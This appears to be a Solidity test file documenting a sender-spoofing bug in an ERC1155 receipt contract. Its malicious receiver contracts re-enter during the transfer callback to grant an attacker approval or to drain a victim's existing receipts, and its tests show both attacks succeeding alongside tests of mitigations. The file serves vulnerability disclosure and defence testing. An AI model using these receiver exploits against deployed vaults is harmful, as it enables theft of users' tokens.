// SPDX-License-Identifier: LicenseRef-DCL-1.0
// SPDX-FileCopyrightText: Copyright (c) 2020 Rain Open Source Software Ltd
pragma solidity =0.8.25;

import {Receipt as ReceiptContract} from "src/concrete/receipt/Receipt.sol";
import {IReceiptV3} from "src/interface/IReceiptV3.sol";
import {IReceiptManagerV2} from "src/interface/IReceiptManagerV2.sol";
import {ReceiptFactoryTest} from "test/abstract/ReceiptFactoryTest.sol";
import {IERC1155Receiver} from "@openzeppelin-contracts-5.6.1/token/ERC1155/IERC1155Receiver.sol";
import {IERC1155} from "@openzeppelin-contracts-5.6.1/token/ERC1155/IERC1155.sol";
import {IERC1155Errors} from "@openzeppelin-contracts-5.6.1/interfaces/draft-IERC6093.sol";

/// @title FreeTransferReceiptManager
/// @notice Minimal manager that authorizes ALL receipt transfers (no-op
/// `authorizeReceiptTransfer3`) — the worst case for this bug, where receipts
/// are unconditionally transferable and there is no per-transfer authorization
/// hook to lean on (e.g. any vault inheriting the base `ReceiptVault`
/// no-op authorizer). `mint` takes an explicit `sender` so tests can drive the
/// spoofed identity directly, the way a vault passes `_msgSender()` (the
/// depositor) into `managerMint`.
contract FreeTransferReceiptManager is IReceiptManagerV2 {
    function authorizeReceiptTransfer3(address, address, address, uint256[] memory, uint256[] memory) external {}

    function mint(IReceiptV3 receipt, address sender, address account, uint256 id, uint256 amount, bytes memory data)
        external
    {
        receipt.managerMint(sender, account, id, amount, data);
    }
}

/// Re-enters the receipt during the acceptance callback and grants `attacker`
/// operator approval. Spoofed as the depositor, so it lands on the depositor.
contract ApprovalSpoofReceiver is IERC1155Receiver {
    IERC1155 internal immutable iReceipt;
    address internal immutable iAttacker;

    constructor(IERC1155 receipt, address attacker) {
        iReceipt = receipt;
        iAttacker = attacker;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        iReceipt.setApprovalForAll(iAttacker, true);
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// Re-enters the receipt during the acceptance callback and directly drains the
/// victim's PRE-EXISTING receipts in the same transaction. No approval needed:
/// `_msgSender()` is spoofed to the victim, so OZ's `from == sender` check
/// passes for `from = victim`.
contract AtomicDrainReceiver is IERC1155Receiver {
    IERC1155 internal immutable iReceipt;
    address internal immutable iVictim;
    address internal immutable iAttacker;
    uint256 internal immutable iDrainId;
    uint256 internal immutable iDrainAmount;

    constructor(IERC1155 receipt, address victim, address attacker, uint256 drainId, uint256 drainAmount) {
        iReceipt = receipt;
        iVictim = victim;
        iAttacker = attacker;
        iDrainId = drainId;
        iDrainAmount = drainAmount;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        iReceipt.safeTransferFrom(iVictim, iAttacker, iDrainId, iDrainAmount, "");
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// A benign receiver that does nothing in the callback — models a trusted
/// recipient such as a pass-through mint/deposit wrapper.
contract BenignReceiver is IERC1155Receiver {
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/// @title ReceiptSpoofEscalationsTest
/// @notice Documents the full escalation surface of issue #309 and the
/// behaviour of the available mitigations, against a free-transfer manager (the
/// worst case). Escalation tests pass against the vulnerable code; mitigation
/// tests prove the defences behave as claimed.
contract ReceiptSpoofEscalationsTest is ReceiptFactoryTest {
    function _setup() internal returns (FreeTransferReceiptManager manager, ReceiptContract receipt) {
        manager = new FreeTransferReceiptManager();
        receipt = ReceiptContract(iFactory.clone(address(iReceiptImplementation), abi.encode(address(manager))));
    }

    // -------------------------------------------------------------------------
    // ESCALATIONS (pass against the vulnerable code)
    // -------------------------------------------------------------------------

    /// E1: a single malicious deposit atomically drains the victim's ENTIRE
    /// pre-existing receipt balance — in the same transaction, no approval
    /// required. The spoof makes `_msgSender() == victim`, so the malicious
    /// receiver's `safeTransferFrom(victim, attacker, ...)` passes OZ's
    /// `from == sender` check.
    function testAtomicDrainOfPreExistingReceipts(uint256 legitAmount, uint256 maliciousAmount) external {
        legitAmount = bound(legitAmount, 1, type(uint128).max);
        maliciousAmount = bound(maliciousAmount, 1, type(uint128).max);

        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 legitId = 1;
        uint256 maliciousId = 2;

        // Victim legitimately deposits earlier, holding real receipts at its EOA.
        manager.mint(receipt, victim, victim, legitId, legitAmount, "");
        assertEq(receipt.balanceOf(victim, legitId), legitAmount);

        AtomicDrainReceiver drainer =
            new AtomicDrainReceiver(IERC1155(address(receipt)), victim, attacker, legitId, legitAmount);

        // Victim is phished into a deposit naming the drainer as the recipient.
        manager.mint(receipt, victim, address(drainer), maliciousId, maliciousAmount, "");

        // The victim's pre-existing receipts were drained to the attacker in the
        // SAME transaction as the malicious deposit.
        assertEq(receipt.balanceOf(victim, legitId), 0, "victim's existing receipts drained");
        assertEq(receipt.balanceOf(attacker, legitId), legitAmount, "attacker took the victim's existing receipts");
    }

    /// E2: the persistent operator approval reaches receipts the victim acquires
    /// LATER. The malicious deposit grants the approval; a future legitimate
    /// deposit's receipts are then drainable by the attacker under its own
    /// identity.
    function testPersistentApprovalDrainsFutureReceipts(uint256 futureAmount) external {
        futureAmount = bound(futureAmount, 1, type(uint128).max);

        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        ApprovalSpoofReceiver malicious = new ApprovalSpoofReceiver(IERC1155(address(receipt)), attacker);

        // Malicious deposit grants attacker operator approval, spoofed as victim.
        manager.mint(receipt, victim, address(malicious), 1, 1, "");
        assertTrue(receipt.isApprovedForAll(victim, attacker), "approval spoofed onto victim");

        // The victim later acquires NEW receipts in good faith.
        uint256 futureId = 2;
        manager.mint(receipt, victim, victim, futureId, futureAmount, "");

        // The attacker drains them later under its OWN identity via the approval.
        vm.prank(attacker);
        receipt.safeTransferFrom(victim, attacker, futureId, futureAmount, "");

        assertEq(receipt.balanceOf(victim, futureId), 0, "future receipts drained");
        assertEq(receipt.balanceOf(attacker, futureId), futureAmount, "attacker took future receipts");
    }

    // -------------------------------------------------------------------------
    // MITIGATIONS
    // -------------------------------------------------------------------------

    /// M1: revocation works mechanically. The victim calls `setApprovalForAll`
    /// directly — outside any manager call `s.sender == 0`, so `_msgSender()`
    /// resolves to the real victim — and the approval is cleared. Afterwards the
    /// attacker can no longer move the victim's receipts.
    function testVictimCanRevokeApproval(uint256 amount) external {
        amount = bound(amount, 1, type(uint128).max);

        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        ApprovalSpoofReceiver malicious = new ApprovalSpoofReceiver(IERC1155(address(receipt)), attacker);
        manager.mint(receipt, victim, address(malicious), 1, 1, "");
        assertTrue(receipt.isApprovedForAll(victim, attacker));

        // Victim revokes.
        vm.prank(victim);
        receipt.setApprovalForAll(attacker, false);
        assertFalse(receipt.isApprovedForAll(victim, attacker), "approval revoked");

        // Victim acquires receipts; the attacker can no longer take them.
        uint256 id = 2;
        manager.mint(receipt, victim, victim, id, amount, "");
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(IERC1155Errors.ERC1155MissingApprovalForAll.selector, attacker, victim));
        receipt.safeTransferFrom(victim, attacker, id, amount, "");
    }

    /// M1 limit: revocation is moot against the atomic drain — by the time the
    /// victim could revoke, the receipts are already gone (moved in the deposit
    /// transaction itself).
    function testRevokeCannotUndoAtomicDrain() external {
        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 legitId = 1;
        uint256 legitAmount = 1000;

        manager.mint(receipt, victim, victim, legitId, legitAmount, "");

        AtomicDrainReceiver drainer =
            new AtomicDrainReceiver(IERC1155(address(receipt)), victim, attacker, legitId, legitAmount);
        manager.mint(receipt, victim, address(drainer), 2, 1, "");

        // Receipts already drained.
        assertEq(receipt.balanceOf(attacker, legitId), legitAmount);

        // Victim revokes any/all approvals afterwards — too late, nothing returns.
        vm.prank(victim);
        receipt.setApprovalForAll(attacker, false);
        assertEq(receipt.balanceOf(attacker, legitId), legitAmount, "revocation does not recover drained receipts");
        assertEq(receipt.balanceOf(victim, legitId), 0);
    }

    /// M2: routing the deposit through a benign receiver (the mint-wrapper
    /// pattern) gives the attack no foothold: no spoofed approval is granted and
    /// the victim's pre-existing receipts are untouched. The spoof window only
    /// opens when the receiver is attacker-controlled.
    function testBenignReceiverGivesNoFoothold(uint256 legitAmount, uint256 depositAmount) external {
        legitAmount = bound(legitAmount, 1, type(uint128).max);
        depositAmount = bound(depositAmount, 1, type(uint128).max);

        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        manager.mint(receipt, victim, victim, 1, legitAmount, "");

        BenignReceiver wrapper = new BenignReceiver();
        manager.mint(receipt, victim, address(wrapper), 2, depositAmount, "");

        assertFalse(receipt.isApprovedForAll(victim, attacker), "no approval granted");
        assertEq(receipt.balanceOf(victim, 1), legitAmount, "pre-existing receipts untouched");
    }

    /// M3: a custody pattern (standing receipts held off the EOA, EOA balance
    /// ~0) isolates the standing balance. The spoof only grants the victim EOA's
    /// identity; the atomic drain targets an empty EOA and reverts, so the
    /// malicious deposit fails entirely and the custodied balance is untouched.
    /// The attacker also cannot reach the custody address (the spoof is the EOA,
    /// not the custody contract).
    function testCustodyIsolatesStandingBalance() external {
        (FreeTransferReceiptManager manager, ReceiptContract receipt) = _setup();
        address victim = makeAddr("victim");
        address custody = makeAddr("custody");
        address attacker = makeAddr("attacker");
        uint256 id = 1;
        uint256 amount = 1000;

        // Victim's standing receipts live in custody; the EOA holds nothing.
        manager.mint(receipt, custody, custody, id, amount, "");
        assertEq(receipt.balanceOf(victim, id), 0);
        assertEq(receipt.balanceOf(custody, id), amount);

        // Phished deposit; the drainer targets the (empty) victim EOA.
        AtomicDrainReceiver drainer = new AtomicDrainReceiver(IERC1155(address(receipt)), victim, attacker, id, amount);
        // Draining an empty EOA reverts, taking the whole malicious deposit with
        // it — the victim loses nothing.
        vm.expectRevert(
            abi.encodeWithSelector(IERC1155Errors.ERC1155InsufficientBalance.selector, victim, 0, amount, id)
        );
        manager.mint(receipt, victim, address(drainer), 2, 1, "");

        // The custodied balance is untouched.
        assertEq(receipt.balanceOf(custody, id), amount, "custody balance isolated");
    }
}
